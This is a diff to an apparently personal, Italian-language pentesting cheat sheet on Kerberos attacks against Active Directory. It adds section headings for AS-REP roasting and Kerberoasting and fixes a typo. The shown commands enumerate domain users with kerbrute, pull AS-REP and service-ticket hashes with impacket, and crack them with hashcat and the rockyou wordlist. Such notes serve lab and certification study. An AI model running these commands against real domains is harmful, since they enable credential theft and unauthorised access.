@@ -10,18 +10,18 @@ ntpdate <IP>
 kerbrute userenum -d <NOME DOMINIO> --dc <IP DC> <LISTA>
 ```
 ![[Pasted image 20230510110607.png]]
-### **TGT**
+### **AspeRoasting**
 
 ```bash
 impacket-GetNPUsers '<NOME DOMINIO>/' -no-pass -usersfile users.txt -format hashcat -outputfile hash
 ```
 ==L'HASH VIENE MESSO NEL FILE DI OUTPUT==
 Dopo cracca l'hash
-
+### **Kerberoasting**
 ```bash
 impacket-GetUserSPNs <NOME MACCHINA>/<USER>:<PASS> -request
 ```
-### **TGT BruteFoc**
+### **TGT BruteForce**
 ### **CRACK KRB5 HASH**
 ```bash
 hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
